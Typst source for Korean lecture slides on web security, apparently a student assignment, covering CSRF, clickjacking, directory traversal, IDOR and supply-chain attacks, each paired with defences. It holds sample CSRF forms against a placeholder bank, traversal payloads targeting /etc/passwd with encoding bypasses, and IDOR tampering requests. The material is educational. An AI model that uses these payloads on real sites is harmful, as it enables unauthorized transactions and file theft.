    - 세션 타임아웃 미설정: 로그아웃 후에도 세션이 서버에 살아있거나, 유효 시간이 무제한인 경우
    
    - 세션 고정: 공격자가 발급받은 세션 ID를 피해자가 사용하도록 유도

  #pagebreak()

  - 대책

    - 세션 ID 생성
      - 안전한 난수 생성기 사용, 충분한 길이 보장
      - 로그인 시마다 새로운 세션 ID 발급 (세션 고정 방지)

    - 세션 속성 설정 (Cookie)
      - 쿠키에 `HttpOnly` 속성 추가
      - HTTPS 통신에서만 쿠키 전송 (스니핑 방어)
      - 크로스 사이트 요청 시 쿠키 전송 제한 (CSRF 방어 보조)

    - 타임아웃 설정
      - 적절한 유효 시간 설정 및 로그아웃 시 서버에서 세션 파기
]

#section(
  title: "세션 관리 및 브라우저 보안",
  hero: [
    #align(center + horizon)[
      #rect(fill: pallete.silver.I, inset: 1em, radius: .5em)[
        #text(fill: white, size: 1.5em, weight: "bold")[HTTP: Stateless Protocol]
      ]
      #text(size: 2em)[#sym.arrow.b]
      \
      
      #text(size: 1.2em)[
        상태를 유지하기 위한 기술 (Cookie & Session)\
        +\
        클라이언트(브라우저)의 보안 모델
      ]
    ]
  ]
)[
  - HTTP 프로토콜은 Stateless함
  
    - 서버는 클라이언트의 이전 요청을 기억하지 못함
    
    - 로그인 상태 유지, 장바구니 기능 등을 위해 별도의 메커니즘 필요
    
      $->$ 세션과 쿠키

  #pagebreak()

  - 웹의 신뢰 모델
    - 서버는 클라이언트(브라우저)가 보내는 식별자(세션 ID)를 신뢰함
    - 브라우저는 서버가 보내는 스크립트를 신뢰하고 실행함

  - 이 신뢰 관계를 악용한 공격
    - 세션 하이재킹: 사용자의 신분증(세션 ID)을 훔쳐서 도용
    - CSRF: 브라우저의 자동 쿠키 전송 기능을 악용, 사용자의 의지와 무관한 요청을 보냄
    - 클릭재킹: 브라우저 화면을 조작하여 사용자를 속임
]

#section(
  title: "세션 관리 및 브라우저 보안/CSRF",
  hero: [
    #vulnerability-chart((
      ([치명성], [높음], 60%),
      ([공격 난이도], [보통], 50%),
      ([파장], [큼], 60%),
      ([취약점 완화 난도], [쉬움], 30%),
    ))
  ]
)[
  - CSRF (Cross-Site Request Forgery, 사이트 간 요청 위조) @mdn-csrf @cf-cross-site-request-forgery

  \
  
  - 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제, 등록 등)를 특정 웹사이트에 요청하게 만드는 공격

  - 사용자가 웹사이트에 로그인된 상태(세션 쿠키 보유)라는 점을 악용함

  #pagebreak()

  - 목적

    - 계정 도용
    
    - 관리자 계정으로 강제 글 작성, 비밀번호 변경, 회원 탈퇴
    
    - 공유기 설정 변경, 쇼핑몰 결제 등

  #pagebreak()

  - 공격 벡터

    - 공격 표면: bank.com에서 송금 업무 시 URL이 아래와 같음
      ```
      https://bank.com/transfer?to=another_user&amount=1000
      ``` 
      
    - 피해자 로컬 기기에 유효한 로그인 세션이 존재함
    
    - 공격자가 피해자에게 공격 콘텐츠 전송

  #pagebreak()

  - 공격 벡터
  
    #text(size: .8em)[
      - 피해자가 클릭하면 브라우저는 bank.com에 요청을 보냄
      ```html
      <html><body><form method="POST"
        action="https://bank.com/transfer?to=attacker&amount=1000000">
          <input class="url-style" type="submit"
            value="[긴급] 지난 주 귀사 발주 물량 누락의 건">
      </form></body></html>
      ```
  
      - 피해자가 페이지를 열람하면 브라우저는 bank.com에 요청을 보냄
      ```html
      <img src="http://bank.com/transfer?to=attacker&amount=1000" width="0" height="0">
      ```
  
      - 쿠키가 포함된 요청이므로 서버는 정당한 사용자의 요청으로 판단하여 이체 실행
    ]

  #pagebreak()

  - 대책

    - CSRF Token 사용 @cf-cross-site-request-forgery
    
      - 토큰을 생성하여 세션에 저장, 폼 전송 시 함께 전달
      
      - 서버는 세션의 토큰과 파라미터의 토큰이 일치하는지 검증
      
      - 공격자는 피해자의 세션에 저장된 토큰을 알 수 없어 공격 실패

  #pagebreak()
  - 대책
  
    - Referer 검증
      - 요청이 발생한 이전 페이지(`Referer` 헤더)가 의도된 도메인인지 확인

    - SameSite 쿠키 설정 @mdn-set-cookie-header
      - `SameSite=Strict` 또는 `Lax`를 설정하여 타 도메인에서 쿠키 요청 시 차단
]

#section(
  title: "세션 관리 및 브라우저 보안/클릭재킹",
  hero: [
    #vulnerability-chart((
      ([치명성], [낮음], 30%),
      ([공격 난이도], [낮음], 20%),
      ([파장], [보통], 30%),
      ([취약점 완화 난도], [매우 쉬움], 10%),
    ))
  ]
)[
  - 클릭재킹 (Clickjacking, UI Redress Attack) @mdn-clickjacking

  \
  
  - 투명한 `<iframe>` 등을 이용해 정상적 웹 페이지 위에 악성 페이지를 겹침
  - 사용자가 의도한 버튼이 아닌 투명한 레이어의 버튼을 클릭하게 함

  #pagebreak()

  - 실현
  
    - 공격 시나리오
      1. 공격자는 "경품 당첨 확인" 버튼이 있는 페이지를 만듦
      2. 해당 버튼 위치에 투명도(`opacity: 0`)를 조절한 `facebook.com`의 "좋아요" 버튼이나 "계정 삭제" 버튼을 iframe으로 겹쳐놓음
      3. 사용자는 "경품 확인"을 클릭했다고 생각하지만, 실제로는 페이스북의 기능을 실행함
      
  #pagebreak()

  - 실현

  #figure(
    image("static/mdn-clickjacking-my-bank.png", width: 60%),
    caption: [클릭재킹 기법에서 공격자의 의도 (soure: Mozilla @mdn-clickjacking)]
  )
  
  #figure(
    image("static/mdn-clickjacking-attacker.png", width: 60%),
    caption: [클릭재킹 기법에서 피해자의 화면 (soure: Mozilla @mdn-clickjacking)]
  )
  
  #pagebreak()

  - 대책

    - `X-Frame-Options` 헤더 설정
      - `DENY`: 해당 페이지를 어떤 프레임에서도 표시하지 않음
      - `SAMEORIGIN`: 동일한 도메인의 프레임 내에서만 표시 허용
      - 예: apache 설정
        ```apache
        Header always set X-Frame-Options "SAMEORIGIN"
        ```
      
    - CSP 설정
      - `Content-Security-Policy: frame-ancestors 'self';`
]

#section(
  title: "파일 및 권한",
  hero: [
    #align(center + horizon)[
      #grid(
        columns: 3,
        align: center + horizon,
        gutter: 1.3em,
        [#rect(stroke: 2pt, inset: 1em, radius: .2em)[*File System*]],
        text(size: 1.8em)[$arrow.l.r.long$],
        [#rect(stroke: 2pt, inset: 1em, radius: .2em)[*Web App*]],
      )
      \
      #text(size: 1.3em, weight: "bold")[Access Control]
      \
      \
      시스템의 자원에\
      누가(Authentication), 어디까지(Authorization)\
      접근할 수 있는가?
    ]
  ]
)[
  - 웹 서버는 근본적으로 파일 서버의 기능을 수행함
  
    - 클라이언트가 요청한 리소스(HTML, 이미지, 다운로드 파일)를 파일 시스템에서 찾아 전달
    
    - 서버 내부의 시스템 파일(`/etc/passwd` 등)이나 설정 파일은 절대 전달하면 안 됨

  #pagebreak()

  - 권한 관리의 두 축
  
    1. 인증 (Authentication): 당신은 누구인가? (로그인)
    
    2. 인가 (Authorization): 당신은 이것을 할 자격이 있는가? (접근 제어)

  #pagebreak()

  - 발생하는 문제들
  
    - 디렉토리 트래버설: 경로 조작을 통해 허용된 폴더를 벗어나 시스템 파일에 접근
    
    - 접근 제어 누락: 로그인만 하면 관리자 페이지 등 비인가 페이지에 접근 가능
    
    - 인가 제어 누락: 내 계정으로 로그인해서 타인의 개인정보나 주문 내역을 조회 (IDOR)
]

#section(
  title: "파일 및 권한/디렉토리 트래버셜",
  hero: [
    #vulnerability-chart((
      ([치명성], [높음], 70%),
      ([공격 난이도], [낮음#footnote[공격 난이도가 낮고, 자동화 도구로 발견 가능하지만, 잘못 설정된 서버에서는 시스템 설정 파일까지 유출될 수 있음]<directory-traversal-fn1>], 30%),
      ([파장], [큼@directory-traversal-fn1], 80%),
      ([취약점 완화 난도], [쉬움], 20%),
    ))
  ]
)[
  - 요청 URL 혹은 파라미터를 변경해, 의도되지 않은 동작을 실행하거나 허용되지 않은 리소스에 접근

  #pagebreak()

  - 공격 벡터

    - 경로 이탈\
      `../../../../etc/passwd` `../secret/config.yml`
    - URL 인코딩 우회\
      `..%2f..%2f..%2fetc%2fpasswd` #text(size: .8em)[(../를 %2f로)]\
      `%2e%2e/%2e%2e/%2e%2e/etc/passwd` #text(size: .8em)[(..를 %2e로)]
    - 이중 인코딩 (서버/프록시/프레임워크 처리 차이 악용)\
      `%252e%252e%252fetc%252fpasswd` #text(size: .8em)[(%25는 %의 인코딩)]
    - Windows 경로/구분자 변형(혼합 환경에서)\
      `..\..\Windows\win.ini` `..%5c..%5cWindows%5cwin.ini`

  #pagebreak()

  - 공격 벡터

    - 경로 정규화 혼란 유도\
      `....//....//etc/passwd` #text(size: .8em)[(필터가 `../`만 막을 때)]\
      `..//..//etc/passwd`
    - NUL 바이트(구형/특정 구현에서 확장자 검사 우회에 쓰였던 패턴)\
      `../../etc/passwd%00.png`

  - 예: `http://myfileserver.me` $->$ `http://myfileserver.me/../unauthorized-file.txt`

  #pagebreak()

  - 공격 표면

    - `GET /download?file=report.pdf`
      ```python
      open(f"{BASE_DIR}/{user_input}")
      ```

  - 대책
    
    - 파일을 ID화, 파일 ID를 파라미터로 받음\
      `GET /download?id=12345`

    - 경로 쿼리를 해결#super[resolve]하여 산출된 경로의 이탈 여부 확인\
      `resolved_path.startswith(BASE_DIR + os.sep)`

    - 입력 필터는 다양한 우회 시나리오로 권장되지 않음

  #pagebreak()
  
  #grid(
    columns: (2fr, 1fr),
    inset: .5em,
    [
      - 디렉토리 리스팅(Directory Listing)

        - 디렉토리 트러버셜과 자주 함께 발견됨
          - 결합 시 더 치명적임

        - 웹 서버에서 디렉토리로 접속할 때, 해당 디렉토리 내의 내용물을 표시하는 기능
    
        - 원래 용도는 원하는 문서를 찾는 데 사용하는 것
    
          - 최근에는 디렉토리 리스팅을 이용한 서버 공격이 잦음
    ],
    [
      #figure(
        image("static/apache-directory-listing.png", width: 100%)
      )
    ]
  )
  
]

#section(
  title: "파일 및 권한/접근 제어 및 인가 제어 결락",
  hero: [
    #vulnerability-chart((
      ([치명성], [높음], 80%),
      ([공격 난이도], [낮음], 20%),
      ([파장], [큼], 80%),
      ([취약점 완화 난도], [쉬움], 20%),
    ))
  ]
)[
  - 접근 제어(Authentication)와 인가(Authorization)의 개념 부재 혹은 설계 미스로 발생

  - 누구나 쉽게 공격할 수 있으나, 치명적인 정보 유출로 이어짐

  #pagebreak()

  - 접근 제어(Authentication) 누락 @ipa-access-control

    - 비공개 정보를 다루는 기능임에도 불구하고, 비밀번호 등 비밀 정보 없이 식별자(ID, 이메일)만으로 접근을 허용하는 경우

    - 이메일 주소 등은 타인에게 공개될 수 있는 정보이므로 인증 수단(Credential)이 될 수 없음

  - 반드시 제3자가 알 수 없는 비밀 정보(비밀번호 등)를 요구하는 인증 기능을 구현

  #pagebreak()

  - 인가 제어(Authorization) 누락 @ipa-access-control

    - 로그인한 사용자가 본인의 권한 밖인 타인의 데이터를 열람하거나 조작할 수 있는 취약점

    - IDOR (Insecure Direct Object References; 부적절한 인가)

    - 로그인(인증)은 통과했으나, "이 데이터를 볼 자격이 있는가?"(인가)를 검증하지 않아 발생

  #pagebreak()

  - 공격 벡터: 파라미터 변조

    - 웹 애플리케이션이 사용자 식별을 세션이 아닌 파라미터에 의존할 때 발생
    
    - 프로필 열람 기능
      - 정상 요청: `http://site.com/mypage?user_id=100` (본인)
      - 공격 요청: `http://site.com/mypage?user_id=101` (타인)
      
    - 주문 내역 조회
      - 정상 요청: `POST /order_detail` (body: `order_no=500`)
      - 공격 요청: `POST /order_detail` (body: `order_no=501`)

  #pagebreak()

  - 대책

    - 사용자 식별 시 외부 입력값 불신
      - `user_id` 등을 URL이나 Form 파라미터로 받지 말고, 서버 측 세션(Session)에 저장된 값을 사용

  #pagebreak()

  - 대책
      
    - 소유권 검증 로직 구현
    
      - 리소스(주문 번호 등)에 접근할 때, 해당 리소스의 소유주가 현재 로그인한 사용자와 일치하는지 반드시 확인
      
  ```sql
  -- 취약한 패턴
  SELECT * FROM orders WHERE order_id = ?;

  -- 개선된 패턴 (소유권 검증 포함)
  SELECT * FROM orders WHERE order_id = ? AND user_id = ?;
  ```
]

#section(
  title: "시스템 인프라",
  hero: [
    - 공격자에게는 시스템 인프라를 담당하는 소프트웨어 공격이 고가치
  
    - 현대의 보안 사고는 개별 서비스 구현보다, 시스템 인프라를 공격하는 사례가 많음
    
    - 인프라의 주기적인 업데이트 및 설정 점검으로 취약점 해소

      - 예: DNS 하이재킹 --- 시스템이 악의적인 DNS 서버에 연결되어 있을 경우, 공격자의 통신 중 개입이 가능해짐 @fortinet-dns-hijacking @wikipedia-dns-hijacking 
  ]
)[]

#section(
  title: "시스템 인프라/중간자 공격",
  hero: [
    - 클라이언트와 서버 통신 중간에 공격자가 개입
    
    - Spoofing, Sniffing, Snooping --- 도청/변조 공격 수행

    \

    - 현대 환경에서는 암호화 통신이 일반화되어있으므로, 이전 세대 프로토콜을 사용하지 않는 것으로 해소
    - TELNET #sym.arrow SSH, HTTP #sym.arrow HTTPS
  ]
)[
  - 초기 인터넷에서는 암호화를 고려하지 않음

  - 하위 호환성을 위해 이전 세대 프로토콜을 사용할 가능성이 높은 기능에서는 대안 마련 필요

  \

  - 메일: 웹 사이트 등 보안 대책이 더 성숙한 수단 고려
  
    - S/MIME, PGP 등의 보안 대책이 있으나, 사용자의 환경이 보안 대책을 지원하지 않을 수 있음

    - 네트워크 구성에 따라, 서버 간 통신 암호화(SMTP over SSL, POP/IMAP over SSL)를 지원하지 않는 통신 경로가 존재할 수 있음
]

#section(
  title: "시스템 인프라/공급망 공격",
  hero: [
    - 소프트웨어 개발/배포 과정의 취약점을 공격

    - 정상적인 공급 경로에 악성코드를 심는 것을 목표로 함

    - 최근에 더욱 활발해진 공격 방식
  ]
)[
  - 사례

    - 2025년 qix 메인테이너 공격 @wiz-widespread-npm-supply-chain-attack-breaking-down @paloaltonetworks-npm-supply-chain-attack

      - 유명 JS 패키지 메인테이너 qix를 피싱 공격
      
      - qix가 관리하는 모든 NPM 패키지에 악성 코드를 삽입 후 마이너 업데이트 배포
      - 영향을 받은 NPM 패키지:\
        #text(size: .6em)[`ansi-styles@6.2.2`, `debug@4.4.2`, `chalk@5.6.1`, `supports-color@10.2.1`, `strip-ansi@7.1.1`, `ansi-regex@6.2.1`, `wrap-ansi@9.0.1`, `color-convert@3.1.1`, `color-name@2.0.1`, `is-arrayish@0.3.3`, `slice-ansi@7.1.1`, `color@5.0.1`, `color-string@2.1.1`, `simple-swizzle@0.2.3`, `supports-hyperlinks@4.1.1`, `has-ansi@6.0.1`, `chalk-template@1.1.1`, `backslash@0.2.1`]
        
  #pagebreak()

  - 사례
  
    - 2024년 xz-utils 백도어 삽입 @cve-2024-3094 @swtch-xz-timeline @tukaani-xz-backdoor

      - xz-utils는 모든 리눅스 배포에 광범위하게 사용

      - 공격자 Jia Tan이 xz-utils 프로젝트에 장기간 기여하며 개발의 신뢰를 획득

      - xz-utils 5.6.0 업데이트 준비 과정에서 공격 코드 조각을 지속적으로 삽입

      - SSH 접속 지연을 발견한 Andres Freund에 의해 발견 @openwall-oss-security-2024-03-29-4

      - 영향을 받은 xz-utils: `xz-utils@5.6.0`, `xz-utils@5.6.1`

  #pagebreak()

  - 대책 @nist-defending-against-software-supply-chain-attacks-508 @skshieldus-headline-2410

    - 정기적인 취약점 스캔, 식별, 패치 적용 프로세스 운영
    
    - 소프트웨어 자재 명세서(SBOM) 사용

    - 무결성 검사 및 이상 징후 모니터링

    - 발견된 취약점의 근본 원인 분석, SDLC 와 개발 프로세스 지속 개선
]

#section(
  title: "마무리",
  hero: text(size: .6em)[
    #table(
      columns: 3,
      align: center + horizon,
      inset: (x: .5em, y: .5em),
      [분류],[내용],[유형],
      
      [임의 코드 및 로직 실행], [주로 의도되지 않은 데이터의 삽입으로 공격자의 의도대로 프로그램의 처리 흐름이 바뀜], align(left)[#grid(columns: (1fr, 1fr), inset: .3em,
        [- SQL 인젝션], [- XSS 공격], [- OS 커맨드 인젝션], [- HTTP 헤더 인젝션], [- 메일 헤더 인젝션], [- 버퍼 오버플로우],
      )],
      
      [
        세션 관리 및\
        브라우저 보안
      ], [사용자의 세션 정보를 탈취하거나, 브라우저의 신뢰 관계를 악용하여 권한을 도용], align(left)[#grid(columns: (1fr, 1fr), inset: .3em,
        [- 세션 관리 미흡], [- CSRF], [- 클릭재킹],
      )],
      
      [파일 및 권한], [파일 시스템 접근이나 중요 기능 수행 시, 적절한 권한 검증이 누락되어 발생], align(left)[#grid(columns: (1fr), inset: .3em,
        [- 디렉토리 트래버설],
        [- 접근 제어 및 인가 결락],
      )],

      [시스템 인프라], [직접 개발한 소프트가 아니라 의존성이 있는 인프라시스템의 취약점을 공격], align(left)[#grid(columns: (1fr, 1fr), inset: .3em,
        [- 구 버전 SW 공격], [- 중간자 공격], [- 공급망 공격],
      )],
    )
  ]
)[
  #pagebreak()
  #set list(marker: [・])
  #text(size: 24pt)[자신의 감상]#text(size: 18pt)[ \/ 전공 지식 측면]
  #text(size: 18pt)[
    - Hacker News, Geek News 등의 기술 뉴스를 구독하면서 다양한 보안 사건들을 접하고 있었다. 때문에 널리 알려진 보안 취약점에 대해서는 충분히 이해하고 있을 것이라고 생각하였다.
    
    - 하지만 개별 공격 벡터의 원리, PoC 코드, 대응 방안을 작성하면서 참고자료에 의존하는 경우가 많았고, 기대보다 보안 대책에 있어 학습이 부족했음을 실감했다.

    - 이 과제를 계기로 개별 공격 벡터에 대한 PoC 작성, 공격 사건에 대해 사례 학습을 하게 되었다.
  ]

  #pagebreak()
  
  #text(size: 24pt)[자신의 감상]#text(size: 18pt)[ \/ 자료의 적절성 측면]
  #text(size: 18pt)[
    - 각 취약점의 공격 사례를 정리하면서 교환유학 파견국인 일본의 사건보다 출신국인 한국의 사건을 중심으로 다루게 되는 경향이 있었다. 의도적으로 그 내용을 덜어내려고 했으나 충분하지 못했다.
    
    - IPA의 〈安全なウェブサイトの作り方〉를 기준으로 자료를 작성하면서, 각 취약점을 다소 억지스럽게 분류하였다. 자의적인 비표준적 분류를 이 자료에 사용한 것은 반성할 점이라고 생각한다.
  ]
  
  #pagebreak()
  
  #text(size: 24pt)[자신의 감상]#text(size: 18pt)[ \/ 과제 요구사항 충족 여부 측면]
  
  #text(size: 18pt)[
    - 〈安全なウェブサイトの作り方〉에서 다루는 내용을 최대한 다루고자 노력하였다. 하지만 90분 수업을 기준으로 양을 조절하니, 자료의 전반적인 깊이가 얕아지는 문제가 있었다.
  
    - 분량에 있어서 "페이지 수를 기준에 초과해도 괜찮다"는 단서가 있었음에도 불구하고, 분량을 조절한 결과가 페이지당 대략 1분 안에 다음으로 진행해야 하는 슬라이드가 되었다는 점이 우려된다.
    ]
]

#bibliography("refs.bib", title: [References], full: true)
